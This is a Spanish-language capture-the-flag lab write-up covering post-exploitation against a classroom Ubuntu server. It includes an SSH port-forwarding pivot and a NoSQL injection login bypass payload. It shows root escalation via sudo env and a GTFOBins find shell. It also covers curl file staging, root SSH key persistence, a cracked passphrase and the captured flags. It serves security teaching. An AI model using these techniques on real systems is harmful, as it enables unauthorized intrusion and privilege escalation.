# Análisis Técnico y Guía de Reporte: Fase de Post-Explotación (Prácticas 1 a 4)

| Metadato | Detalle |
| :--- | :--- |
| **Autor / Operador** | **Lozano** (`lozan` / `lozano`) |
| **Metodología** | Cyber Kill Chain & OWASP / MITRE ATT&CK |
| **Máquina Atacante** | `Kali-Linux-CLI` (`192.168.1.4` / `192.168.1.5` en red NAT `cetipracticas`) |
| **Servidor Objetivo (Target)** | `ubuntuServer` — Ubuntu Server 22.04.5 LTS (`192.168.1.101` / `cetilab.local`) |
| **Punto de Partida** | Acceso SSH inicial como `developer` (`UID 1002`) mediante llave `/home/kali/developer.key` (`chmod 600`) y passphrase/hash crackeado `Ceti2245` |
| **Suite de Automatización** | [`auto_hack_parte2.sh`](./auto_hack_parte2.sh) y [`revert_hack_parte2.sh`](./revert_hack_parte2.sh) |

---

## 1. Clasificación Metodológica y Análisis Técnico de las 4 Prácticas

Siguiendo la metodología **Cyber Kill Chain** (etapas de *Exploitation*, *Privilege Escalation*, *Command & Control / Persistence* y *Actions on Objectives*), el registro de evidencias ([`Registro de Evidencias CTF.md`](./Registro%20de%20Evidencias%20CTF.md)) se estructura en cuatro prácticas modulares:

---

### PRÁCTICA 1: Port Forwarding e Inyección NoSQL (Explotación de Servicios Internos)

#### 1.1 Fundamento Técnico
Durante la enumeración interna de puertos en `ubuntuServer`, se detectó un servicio HTTP (`Werkzeug/2.0.2 Python/3.10.12`) escuchando exclusivamente en la interfaz loopback local (`127.0.0.1:5000`), inaccesible directamente desde la red `192.168.1.0/24`.

1. **Pivoteo mediante SSH Local Port Forwarding**:
   - Comando:
     ```bash
     ssh -f -N -i /home/kali/developer.key -L 5000:127.0.0.1:5000 developer@192.168.1.101
     ```
   - El cliente SSH en Kali abre el socket `127.0.0.1:5000` local y encapsula todo el tráfico TCP a través del túnel autenticado hacia el loopback `127.0.0.1:5000` de `ubuntuServer`.
2. **Reconocimiento del Servicio Interno (`GET /`)**:
   - Expone el **"Panel de Control Interno (NoSQL Engine)"**, el cual indica: `Envia credenciales JSON mediante POST a /login`.
3. **Explotación de NoSQL Injection (Authentication Bypass)**:
   - El backend procesa el cuerpo JSON directamente dentro de una consulta de base de datos documental (MongoDB) sin sanitizar operadores de consulta.
   - Al inyectar el operador relacional `{"$ne": null}` (*Not Equal to null*) tanto en `username` como en `password`:
     ```json
     {
       "username": { "$ne": null },
       "password": { "$ne": null }
     }
     ```
   - La consulta evalúa como `true` para el primer documento existente en la colección de usuarios (habitualmente el administrador), devolviendo `HTTP/1.0 200 OK`, `"status": "success"`, `"message": "Autenticacion Correcta"` y la primera bandera:
     - **Bandera 1**: `CETI{NOSQLi_P0rt_F0rw4rd_M4st3r}`

---

### PRÁCTICA 2: Escalada de Privilegios Básica y Transferencia de Archivos (Movimiento y Exfiltración)

#### 2.1 Enumeración de Privilegios Locales (`sudo -l`)
Al auditar los permisos delegados al usuario `developer` (`UID 1002`) mediante `sudo -l`, se identificó una configuración crítica en `/etc/sudoers`:
```text
User developer may run the following commands on cetipracticas:
    (ALL) NOPASSWD: /usr/bin/awk
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/python3
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/env
```

#### 2.2 Escalada de Privilegios Básica vía `/usr/bin/env`
- El binario `/usr/bin/env` permite ejecutar cualquier programa dentro de un entorno modificado. Al ejecutarse con `sudo env /bin/bash`, el proceso hijo `/bin/bash` hereda el `EUID=0` (`root`) sin solicitar contraseña (`NOPASSWD`).

#### 2.3 Transferencia Bidireccional de Archivos (Staging & Exfiltration)
- Para transferir herramientas de post-explotación y exfiltrar evidencias entre Kali (`192.168.1.4` / `192.168.1.5`) y `ubuntuServer` (`192.168.1.101`):
  1. Se levanta un servidor HTTP efímero con `python3 -m http.server 8000`.
  2. Desde el objetivo se descarga `file.txt` con `curl http://192.168.1.4:8000/file.txt --output file.txt`.
  3. Se crea `touch file2.txt` y se valida la transferencia inversa, registrando en los logs del servidor HTTP los códigos de estado `GET /file.txt HTTP/1.1 200` y `GET /file2.txt HTTP/1.1 200`.

---

### PRÁCTICA 3: Persistencia, Gestión de Identidades y Criptografía SSH

#### 3.1 Generación de Llaves Asimétricas (ED25519 vs. RSA)
1. **En Kali Linux (`Ed25519`)**:
   - `ssh-keygen -t ed25519 -f ~/.ssh/llave_p -N ""`
   - Genera una llave de curva elíptica Curve25519 compacta y de alta seguridad (`llave_p` y `llave_p.pub`).
2. **En `ubuntuServer` como `root` (`RSA 3072 bits`)**:
   - `ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""`
   - Genera el par `/root/.ssh/id_rsa` y `/root/.ssh/id_rsa.pub`.

#### 3.2 Análisis del Fallo de `ssh-copy-id`
- Al ejecutar `ssh-copy-id -i ~/.ssh/llave_p.pub developer@192.168.1.101` sin proporcionar la llave de identidad previa (`developer.key`), el demonio OpenSSH presenta el banner de advertencia y rechaza la autenticación (`Permission denied, please try again`) porque la directiva `PasswordAuthentication no` impide inicios de sesión basados en contraseña interactiva.

#### 3.3 Reproducción y Corrección de Permisos Criptográficos en OpenSSH (`0664` $\rightarrow$ `0600`)
- OpenSSH verifica estrictamente el modo de permisos (`stat`) de cualquier llave privada antes de usarla.
- Cuando `id_rsa` tiene permisos `0664` (`-rw-rw-r--`, legible por grupo y otros), `ssh -i id_rsa root@192.168.1.101` aborta inmediatamente con:
  ```text
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  Permissions 0664 for 'id_rsa' are too open.
  It is required that your private key files are NOT accessible by others.
  This private key will be ignored.
  Load key "id_rsa": bad permissions
  ```
- Al restringir los permisos exclusivamente al propietario mediante `chmod 600 id_rsa` (`-rw-------`) y registrar la clave pública en `/root/.ssh/authorized_keys`, OpenSSH acepta la identidad y otorga acceso directo como `root@cetipracticas`.

---

### PRÁCTICA 4: Post-Explotación Avanzada (GTFOBins) y Resolución de CTF

#### 4.1 Escalada vía GTFOBins (`/usr/bin/find`)
- En sistemas donde `/bin/env` o `sudo su` están restringidos pero `/usr/bin/find` figura en `sudoers` con `NOPASSWD`, es posible escapar a una shell interactiva mediante la acción `-exec`:
  - Como usuario estándar (`developer`): `find . -exec /bin/sh \; -quit` $\rightarrow$ mantiene `whoami = developer`.
  - Con `sudo`: `sudo find . -exec /bin/sh \; -quit` $\rightarrow$ escala a `whoami = root` (`uid=0(root)`).

#### 4.2 Compromiso Total y Cadena de Intrusión (`root.txt`)
- La lectura de `/root/root.txt` entrega la bandera final del laboratorio:
  - **Bandera Final**: `CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}`
- **Trazabilidad de extremo a extremo de la Kill Chain del laboratorio**:
  1. `DNS`: Descubrimiento de `admin-backup` y transferencia de zona `AXFR` en `cetilab.local` (11 subdominios).
  2. `HTTP (SQLi)`: Enumeración de VHOST `app.cetilab.local` con Gobuster e inyección SQL con Burp Suite.
  3. `SAMBA`: Enumeración de *Null Session* con `smbmap` en `//app.cetilab.local/archivos_ti` (`nota_desarrollo.txt` y `respaldo_credenciales.txt`).
  4. `FTP`: Identificación del servicio `vsftpd 3.0.5` y cuenta `ftpuser`.
  5. `SNMP`: Enumeración `snmpwalk` (`v2c`, comunidad `public`) que expone en `sysLocation` la ruta `/srv/nfs/respaldos_ti` y el usuario `developer`.
  6. `NFS`: Montaje de `/srv/nfs/respaldos_ti` y exfiltración de `developer.key`.
  7. `SSH`: Crackeo del hash MD5 (`Ceti2245`) con John the Ripper y acceso inicial como `developer@cetipracticas`.
  8. `SMTP`: Enumeración de `Postfix smtpd` (`CN=cetipracticas`).
  9. `NoSQLi`: Pivoteo por SSH Local Port Forwarding (`-L 5000:127.0.0.1:5000`) y bypass de autenticación con `{"$ne": null}` (`CETI{NOSQLi_P0rt_F0rw4rd_M4st3r}`).
  10. `ROOT`: Escalada de privilegios vía `sudo env /bin/bash` y GTFOBins `sudo find . -exec /bin/sh \; -quit` (`CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}`).

#### 4.3 Validación de Plataforma Externa CTF (Hack The Box — Máquina "Meow")
- Verificación de túnel VPN OpenVPN (`ip a show tun0`) y validación del reto **Meow** en Hack The Box completado por **Lozano** (`#629953 Machine Rank`, `150 XP Earned`, `Level 2`).

---

## 2. Matriz de Automatización: CLI (`auto_hack_parte2.sh`) vs. Intervención Manual / Gráfica

| Práctica | Paso Técnico | ¿100% Automatizable en CLI? | Implementación en `auto_hack_parte2.sh` | ¿Cuándo requiere intervención manual / gráfica? |
| :--- | :--- | :---: | :--- | :--- |
| **Práctica 1** | Túnel SSH `-L 5000:127.0.0.1:5000` | **Sí** | `ssh -f -N -L 5000:127.0.0.1:5000 ...` | Nunca (se ejecuta en background sin bloquear la terminal). |
| **Práctica 1** | Consulta `GET /` y `POST /login` NoSQLi | **Sí (vía `curl -i`)** | Envía el payload JSON y muestra cabeceras HTTP + Flag en terminal. | **Opcional en GUI**: Si el profesor solicita captura visual dentro de la interfaz de **Burp Suite Repeater** o del **Navegador Web** en `http://127.0.0.1:5000`. |
| **Práctica 2** | `whoami`, `id`, `sudo -l` y `sudo env /bin/bash` | **Sí** | Ejecuta los comandos por SSH y muestra el cambio efectivo a `uid=0(root)`. | Si se desea interactuar manualmente dentro de la shell de `root`. |
| **Práctica 2** | Servidor `python3 -m http.server 8000` y `curl` | **Sí** | Levanta el servidor en background, transfiere `file.txt` y `file2.txt` e imprime los logs `HTTP/1.1 200`. | Nunca. |
| **Práctica 3** | Generación de llaves (`llave_p`, `id_rsa`) y fallo `ssh-copy-id` | **Sí** | Usa `-N ""` para no pedir passphrase y `BatchMode=yes` para mostrar el error `Permission denied` sin colgarse. | Nunca. |
| **Práctica 3** | Error de permisos `0664` (`UNPROTECTED PRIVATE KEY FILE`) y fix `0600` | **Sí** | Aplica `chmod 664 id_rsa`, captura el banner exacto de rechazo de OpenSSH, aplica `chmod 600 id_rsa` y autentica como `root`. | Nunca. |
| **Práctica 4** | Escalada GTFOBins (`sudo find . -exec /bin/sh \; -quit`) y lectura de `/root/root.txt` | **Sí** | Ejecuta `find` como `developer` y luego con `sudo`, mostrando `root` y el contenido íntegro de `/root/root.txt`. | Nunca. |
| **Práctica 4** | Trofeo Hack The Box (`Meow`) | **Parcial (CLI muestra resumen + `tun0`)** | Verifica `ip a show tun0` e imprime el banner de logro de **Lozano**. | **Requiere GUI**: La captura del trofeo visual de Hack The Box (`Meow.png`) proviene del navegador web en la plataforma HTB. |

---

## 3. Guía Rápida de Ejecución y Limpieza

### 3.1 Ejecutar la Suite Interactiva en Kali Linux
Desde la terminal de Kali Linux (el repositorio ya está montado en `/home/kali/repo` y copiado en `/home/kali/`):
```bash
sudo /home/kali/repo/auto_hack_parte2.sh
```
*(En cada pausa `Presiona [ENTER] para continuar...`, puedes tomar tu captura de pantalla manual o ejecutar desde Windows `.\scripts\vm-snap.ps1`).*

### 3.2 Revertir Todos los Cambios a Cero (`Zero-Footprint`)
```bash
sudo /home/kali/repo/revert_hack_parte2.sh
```

### 3.3 Compilar el Reporte Final DOCX y Subir a Google Docs
Desde PowerShell en Windows (`D:\Orchestrator\VBox-AI-Agent`):
```powershell
.\scripts\build-report.ps1
```
